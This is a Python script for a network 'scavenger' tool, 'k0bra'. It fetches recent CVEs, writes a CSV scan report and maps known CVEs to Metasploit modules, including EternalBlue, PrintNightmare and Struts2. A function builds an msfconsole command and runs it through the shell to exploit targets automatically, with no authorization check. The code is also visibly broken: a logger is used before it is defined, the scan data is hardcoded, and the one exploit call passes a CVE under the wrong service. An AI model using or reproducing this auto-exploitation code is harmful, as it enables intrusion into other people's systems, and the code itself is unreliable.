#!/usr/bin/env python3
import sqlite3
import logging
import scapy.all as scapy
import nmap
import plotly.graph_objects as go
import requests
import subprocess
import asyncio
import json
import csv
import re
from typing import List, Dict

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Logging configuration
logging.basicConfig(filename='k0bra.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Metasploit module mapping
METASPLOIT_MODULES = {
    "SMB": {
        "CVE-2017-0143": "exploit/windows/smb/ms17_010_eternalblue",
        "CVE-2021-34527": "exploit/windows/smb/printnightmare",
    },
    "HTTP": {
        "CVE-2017-5638": "exploit/multi/http/struts2_content_type_ognl",
        "CVE-2021-26084": "exploit/multi/http/confluence_widget_connector_rce",
    },
    "SSL": {
        "CVE-2014-0160": "auxiliary/scanner/ssl/openssl_heartbleed",
    },
    "Android": {
        "CVE-2017-13156": "exploit/android/local/janus",
        "CVE-2021-0938": "exploit/android/local/put_user_vroot",
    },
}

# Fetch CVE data from CIRCL API
def fetch_cve_data():
    """Fetches the latest CVE details from the CIRCL API."""
    url = "https://cve.circl.lu/api/last"
    try:
        response = requests.get(url)
        response.raise_for_status()
        cve_data = response.json()
        return cve_data
    except requests.exceptions.RequestException as e:
        print(f"{RED}Error fetching CVE data: {e}{RESET}")
        return None

# Function to display CVE details
def display_cve_data(cve_data):
    """Displays fetched CVE data."""
    if cve_data:
        print(GREEN + "Latest CVEs:" + RESET)
        for cve in cve_data:
            print(f"{CYAN}CVE ID: {cve['id']}{RESET}")
            print(f"{YELLOW}Description: {cve['summary']}{RESET}")
            print(f"{RED}Published Date: {cve['Published']}{RESET}")
            print(f"{YELLOW}CVSS Score: {cve['cvss']}\n{RESET}")
    else:
        print(RED + "No CVE data available." + RESET)

def print_banner():
    """Prints the banner for the tool."""
    print(CYAN + "    ██   ██  ██████  ██████  ██████  ██████  ███████  ███████  ███████  ")
    print("    ██  ██  ██  ████ ██   ██ ██   ██ ██   ██ ██   ██ ")
    print("    █████   ██ ██ ██ ██████  ██████  ███████  ████████  ████████  ")
    print("    ██  ██  ████ ██   ██ ██   ██ ██   ██ ██   ██ ██   ██ ")
    print("    ██   ██  ██████  ██████  ███████  ████████  ████████  ████████  ")
    print(GREEN + "Welcome to k0bra - The Network Scavenger! Developed by b0urn3.")
    print("Other tools found at https://github.com/q4n0")
    print("Email: b0urn3@proton.me Instagram: onlybyhive\n" + RESET)

def get_user_input():
    """Input function for the target network or IP range."""
    print("Please provide the target network or IP range (e.g., 192.168.1.0/24):")
    target_network = input().strip()
    
    # Validate network format using regex
    if not re.match(r"^(\d{1,3}\.){3}\d{1,3}(/[\d]{1,2})?$", target_network):
        print(RED + "Invalid network or IP range format. Please try again." + RESET)
        return get_user_input()  # Retry if invalid
    return target_network

def get_cve_input():
    """Input function for the path to a local CVE JSON file."""
    print("Please provide the path to the CVE JSON file (e.g., /path/to/cve_database.json):")
    cve_file_path = input().strip()
    
    # Validate file path
    if not cve_file_path.endswith(".json"):
        print(RED + "Invalid file type. Please provide a valid JSON file." + RESET)
        return get_cve_input()  # Retry if invalid
    return cve_file_path

class NetworkSecurityTool:
    def __init__(self, target_network):
        """Initialize the security mapping tool."""
        self.target = target_network
        self.vulnerabilities = []
        self.network_map = {}
        self.db_connection = self._initialize_database()
        self.logger = self._setup_logging()

    def _initialize_database(self):
        """Create local SQLite database for vulnerability tracking."""
        try:
            conn = sqlite3.connect('security_map.db')
            cursor = conn.cursor()
            cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities
                              (ip TEXT, mac TEXT, port INTEGER, vulnerability TEXT, risk_score INTEGER)''')
            conn.commit()
            return conn
        except sqlite3.Error as e:
            self.logger.error(f"Database connection failed: {e}")
            print(RED + "Database connection failed. Check logs for details." + RESET)
            exit(1)

    def _setup_logging(self):
        """Configure logging with rotation."""
        logger = logging.getLogger('NetworkSecurityTool')
        handler = logging.FileHandler('tool.log')
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
        return logger

    def save_report(self, network_info, open_ports, vulnerabilities):
        """Generate a CSV report for the scan results."""
        try:
            with open('scan_report.csv', mode='w', newline='') as file:
                writer = csv.writer(file)
                writer.writerow(['IP Address', 'Open Ports', 'Vulnerabilities', 'Risk Score'])
                for ip, ports in open_ports.items():
                    vulnerability_list = []
                    risk_score = 'None'
                    for vulnerability in vulnerabilities.get(ip, []):
                        vulnerability_list.append(vulnerability[0])
                        risk_score = vulnerability[1]  # Assuming first vulnerability is most critical
                    writer.writerow([ip, ', '.join(map(str, ports)), ', '.join(vulnerability_list), risk_score])
            print(GREEN + "Scan report saved as scan_report.csv" + RESET)
        except Exception as e:
            self.logger.error(f"Error saving scan report: {e}")
            print(RED + "Failed to save scan report. Check logs for details." + RESET)

def metasploit_exploit(target_ip, target_port, service, cve_id):
    """Automatically run Metasploit module based on service and CVE."""
    if service in METASPLOIT_MODULES and cve_id in METASPLOIT_MODULES[service]:
        module = METASPLOIT_MODULES[service][cve_id]
        try:
            command = f"msfconsole -x 'use {module}; set RHOSTS {target_ip}; set RPORT {target_port}; exploit'"
            print(YELLOW + f"Running Metasploit module for {service} ({cve_id}): {module}" + RESET)
            subprocess.run(command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(RED + f"Metasploit exploit failed: {str(e)}" + RESET)
        except FileNotFoundError:
            print(RED + "Metasploit not found. Ensure it's installed and accessible." + RESET)
    else:
        print(RED + f"No Metasploit module found for {service} and CVE {cve_id}" + RESET)

# Async main function
async def main():
    # Get user inputs for network and CVE file
    target_network = get_user_input()  # Get target network from user input
    cve_file_path = get_cve_input()  # Get CVE JSON file path from user input

    # Initialize the security tool
    tool = NetworkSecurityTool(target_network)

    # Fetch and display the latest CVEs
    cve_data = fetch_cve_data()  # Fetch latest CVE data
    display_cve_data(cve_data)   # Display the fetched CVE data

    # Perform scan and get results (example)
    network_info = {}  # Example: {'192.168.1.1': 'active'}
    open_ports = {"192.168.1.1": [22, 80, 443]}  # Example: IP with open ports
    vulnerabilities = {"192.168.1.1": [("CVE-2021-34527", 9)]}  # Example vulnerabilities
    tool.save_report(network_info, open_ports, vulnerabilities)  # Save report as CSV

    # Trigger Metasploit exploit based on found vulnerabilities
    for ip, vulns in vulnerabilities.items():
        for cve, risk in vulns:
            metasploit_exploit(ip, 443, "HTTP", cve)  # Example for HTTP service with CVE-2021-34527

# Run the main function
if __name__ == "__main__":
    asyncio.run(main())
